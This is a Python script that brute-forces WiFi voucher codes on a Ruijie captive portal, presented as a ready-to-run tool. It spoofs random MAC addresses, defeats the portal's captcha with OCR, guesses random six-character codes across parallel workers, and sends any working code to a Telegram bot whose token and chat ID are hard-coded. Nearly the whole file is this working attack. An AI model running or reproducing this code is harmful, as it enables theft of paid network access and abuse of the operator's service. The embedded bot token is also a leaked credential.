#!/usr/bin/env python3
"""
Ruijie WiFi Code Scanner — standalone, no bot framework needed.
Run: python scan.py
Found codes are printed to screen AND sent to your Telegram chat.
"""
import asyncio, aiohttp, re, time, random, string, sys, os, io

# ── CONFIG ────────────────────────────────────────────────────────────────────
BOT_TOKEN  = os.environ.get("BOT_TOKEN",  "8915737207:AAFymbnH_1Ga39WrcoRmfhca73hGhwF4kzY")
CHAT_ID    = os.environ.get("CHAT_ID",    "5406128711")
SESSION_URL = os.environ.get("SESSION_URL", "")   # set via env or prompted below

CODE_LEN   = 6          # voucher code length (digits+letters)
WORKERS    = 4          # parallel workers (keep low on Android to save RAM)
# ─────────────────────────────────────────────────────────────────────────────

PORTAL = "https://portal-as.ruijienetworks.com"
VOUCHER_URL = PORTAL + "/api/auth/voucher/?lang=en_US"

found_codes = []
checked = 0
start_time = time.time()

# ── helpers ───────────────────────────────────────────────────────────────────
def random_mac():
    return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))

def replace_mac(url, mac):
    return re.sub(r'mac=[^&]+', f'mac={mac}', url)

async def tg_send(session, text):
    try:
        await session.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"},
            timeout=aiohttp.ClientTimeout(total=10)
        )
    except Exception as e:
        print(f"[TG] send failed: {e}")

async def get_session_id(session, session_url):
    mac = random_mac()
    url = replace_mac(session_url, mac)
    headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "accept": "text/html,application/xhtml+xml,*/*",
    }
    try:
        async with session.get(url, headers=headers, allow_redirects=True,
                               timeout=aiohttp.ClientTimeout(total=10)) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return sid.group(1) if sid else None
    except:
        return None

async def get_captcha_image(session, sid):
    params = {"sessionId": sid, "_t": str(time.time())}
    headers = {
        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36",
        "referer": f"{PORTAL}/download/static/maccauth/src/index.html?sessionId={sid}",
    }
    try:
        async with session.get(f"{PORTAL}/api/auth/captcha/image",
                               params=params, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=10)) as r:
            return await r.read()
    except:
        return None

async def verify_captcha(session, sid, text):
    headers = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36",
        "referer": f"{PORTAL}/download/static/maccauth/src/index.html?sessionId={sid}",
    }
    try:
        async with session.post(f"{PORTAL}/api/auth/captcha/verify",
                                json={"sessionId": sid, "authCode": text},
                                headers=headers,
                                timeout=aiohttp.ClientTimeout(total=10)) as r:
            data = await r.json()
            return data.get("success") == True
    except:
        return False

def solve_captcha_image(image_bytes):
    """Try pytesseract OCR to solve captcha."""
    try:
        from PIL import Image, ImageFilter, ImageEnhance
        import pytesseract
        img = Image.open(io.BytesIO(image_bytes)).convert("L")
        img = img.resize((img.width * 2, img.height * 2), Image.LANCZOS)
        img = ImageEnhance.Contrast(img).enhance(2.0)
        img = img.filter(ImageFilter.SHARPEN)
        # threshold
        img = img.point(lambda x: 0 if x < 140 else 255, '1')
        text = pytesseract.image_to_string(
            img,
            config='--psm 8 --oem 3 -c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        )
        return ''.join(text.strip().split())[:6] or None
    except Exception as e:
        return None

async def get_auth_code(session, session_url):
    """Get a valid sessionId + authCode pair."""
    for _ in range(10):
        sid = await get_session_id(session, session_url)
        if not sid:
            await asyncio.sleep(1)
            continue
        for _ in range(8):
            img = await get_captcha_image(session, sid)
            if not img:
                continue
            text = solve_captcha_image(img)
            if not text:
                continue
            ok = await verify_captcha(session, sid, text)
            if ok:
                return sid, text
            await asyncio.sleep(0.3)
        await asyncio.sleep(0.5)
    return None, None

async def check_code(session, session_url, code, tg_session):
    global checked, found_codes
    sid, auth = await get_auth_code(session, session_url)
    if not sid:
        return False
    headers = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36",
        "referer": f"{PORTAL}/download/static/maccauth/src/index.html?sessionId={sid}",
        "origin": PORTAL,
    }
    data = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth}
    try:
        async with session.post(VOUCHER_URL, json=data, headers=headers,
                                timeout=aiohttp.ClientTimeout(total=15)) as r:
            body = await r.text()
            if "logonUrl" in body:
                found_codes.append(code)
                msg = f"✅ FOUND CODE: <b>{code}</b>\n⏱ {time.strftime('%H:%M:%S')}"
                print(f"\n{'='*40}\n✅ FOUND: {code}\n{'='*40}")
                await tg_send(tg_session, msg)
                return True
    except:
        pass
    return False

# ── code generator ────────────────────────────────────────────────────────────
def code_generator(length=6):
    """Generate random codes one at a time — uses almost zero RAM."""
    chars = string.digits + string.ascii_uppercase
    while True:
        yield ''.join(random.choices(chars, k=length))

# ── worker ────────────────────────────────────────────────────────────────────
async def worker(queue, session_url, tg_session):
    global checked
    async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar()) as session:
        while True:
            code = await queue.get()
            if code is None:
                queue.task_done()
                break
            try:
                await check_code(session, session_url, code, tg_session)
            except Exception as e:
                print(f"[worker] error on {code}: {e}")
            finally:
                checked += 1
                queue.task_done()

async def progress_printer():
    """Print speed every 30 seconds."""
    global checked
    last = 0
    last_time = time.time()
    while True:
        await asyncio.sleep(30)
        now = time.time()
        rate = (checked - last) / (now - last_time)
        elapsed = int(now - start_time)
        print(f"[scan] checked={checked} | speed={rate:.1f}/s | found={len(found_codes)} | elapsed={elapsed}s")
        last = checked
        last_time = now

async def main():
    global start_time
    session_url = SESSION_URL
    if not session_url:
        session_url = input("Ruijie URL ထည့်ပါ (wifidog URL): ").strip()
    if not session_url:
        print("URL မထည့်ဘူး — ထွက်မည်")
        sys.exit(1)

    print(f"[scan] Code length: {CODE_LEN} | Workers: {WORKERS}")
    print(f"[scan] Scanning started — results will appear here and in Telegram")

    async with aiohttp.ClientSession() as tg_session:
        await tg_send(tg_session, f"🚀 <b>Scan started</b>\nCode length: {CODE_LEN} digits\nWorkers: {WORKERS}")

        queue = asyncio.Queue(maxsize=WORKERS * 4)
        start_time = time.time()

        workers = [
            asyncio.create_task(worker(queue, session_url, tg_session))
            for _ in range(WORKERS)
        ]
        progress_task = asyncio.create_task(progress_printer())

        gen = code_generator(CODE_LEN)
        stop_event = asyncio.Event()

        async def feeder():
            for code in gen:
                if stop_event.is_set():
                    break
                await queue.put(code)
            for _ in range(WORKERS):
                await queue.put(None)

        feed_task = asyncio.create_task(feeder())
        try:
            await asyncio.gather(*workers)
        except (KeyboardInterrupt, asyncio.CancelledError):
            stop_event.set()
            feed_task.cancel()

        progress_task.cancel()
        await asyncio.gather(*workers, return_exceptions=True)

        total = int(time.time() - start_time)
        msg = (
            f"🏁 <b>Scan finished</b>\n"
            f"Checked: {checked}\n"
            f"Found: {len(found_codes)}\n"
            f"Codes: {', '.join(found_codes) if found_codes else 'none'}\n"
            f"Time: {total}s"
        )
        print(f"\n[scan] Done — {checked} checked, {len(found_codes)} found")
        await tg_send(tg_session, msg)

if __name__ == "__main__":
    asyncio.run(main())
